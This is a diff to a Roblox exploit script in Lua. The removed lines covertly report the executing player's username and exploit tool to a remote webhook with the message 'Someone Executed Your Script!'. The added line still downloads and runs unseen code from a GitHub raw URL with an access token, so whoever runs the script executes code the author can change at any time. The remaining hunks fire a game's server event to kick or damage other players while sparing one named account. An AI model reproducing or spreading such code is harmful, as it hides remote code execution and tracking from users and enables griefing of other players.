@@ -1,64 +1,4 @@
-local sus = loadstring(game:HttpGet("https://raw.githubusercontent.com/DragonixGaming/Stuff/main/sss?token=GHSAT0AAAAAAB527D7ENCZC7RW3DDYSRIPAY7X3L2A", true))()
-local webhookcheck =
-
-   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
-
-   secure_load and "Sentinel" or
-
-   KRNL_LOADED and "Krnl" or
-
-   SONA_LOADED and "Sona" or
-
-   "Kid with shit exploit"
-
-local url =
-
-   sus
-
-local data = {
-
-   ["content"] = " message(no embed)- you can take out embed if by deleting the bottom stuff(where it says EMBEDS)",
-
-   ["embeds"] = {
-
-       {
-
-           ["title"] = "**Someone Executed Your Script!**",
-
-           ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**",
-
-           ["type"] = "rich",
-
-           ["color"] = tonumber(0x7269da),
-
-           ["image"] = {
-
-               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
-
-                   tostring(game:GetService("Players").LocalPlayer.Name)
-
-           }
-
-       }
-
-   }
-
-}
-
-local newdata = game:GetService("HttpService"):JSONEncode(data)
-
-local headers = {
-
-   ["content-type"] = "application/json"
-
-}
-
-request = http_request or request or HttpPost or syn.request
-
-local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-
-request(abcdef)
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DragonixGaming/Stuff/main/sss?token=GHSAT0AAAAAAB66FCYBIGJKFCAM7MGQYV3UY7ZIKBA", true))()
 
 local mainlyy = Instance.new("ScreenGui")
 
@@ -517,10 +457,10 @@ vis.TextWrapped = true
 
       wait()
 
-	  	if FindPlayer(plr).Character.Name ~= game.Players.alman_a7.Name then
+	  	if FindPlayer(plr).Character.Name ~= alman_a7 then
       		game:GetService("ReplicatedStorage").AnubisPin:FireServer(FindPlayer(plr).Character.Humanoid, "kicked", 0.25, Vector3.new(-0, 0, -0))
 
-      	end
+      		end
 
 	  end)
 
@@ -637,7 +577,7 @@ vis.TextWrapped = true
 
       wait()
 
-	  	if FindPlayer(plr).Character.Name ~= game.Players.alman_a7.Name then
+	  	if FindPlayer(plr).Character.Name ~= alman_a7 then
 
       		for i,hit in ipairs(FindPlayer(plr).Character:GetChildren())do
 
@@ -697,7 +637,7 @@ vis.TextWrapped = true
 
       wait()
 
-	  	if FindPlayer(plr).Character.Name ~= game.Players.alman_a7.Name then
+	  	if FindPlayer(plr).Character.Name ~= alman_a7 then
 
       		for i,hit in ipairs(FindPlayer(plr).Character:GetChildren())do
 
@@ -757,7 +697,7 @@ vis.TextWrapped = true
 
       wait()
 
-	  	if FindPlayer(plr).Character.Name ~= game.Players.alman_a7.Name then
+	  	if FindPlayer(plr).Character.Name ~= alman_a7 then
 
       		for i,hit in ipairs(FindPlayer(plr).Character:GetChildren())do
 
@@ -836,7 +776,7 @@ vis.TextWrapped = true
 
       wait()
 
-	  	if FindPlayer(plr).Character.Name ~= game.Players.alman_a7.Name then
+	  	if FindPlayer(plr).Character.Name ~= alman_a7 then
 
       		for i,hit in ipairs(FindPlayer(plr).Character:GetChildren())do
 
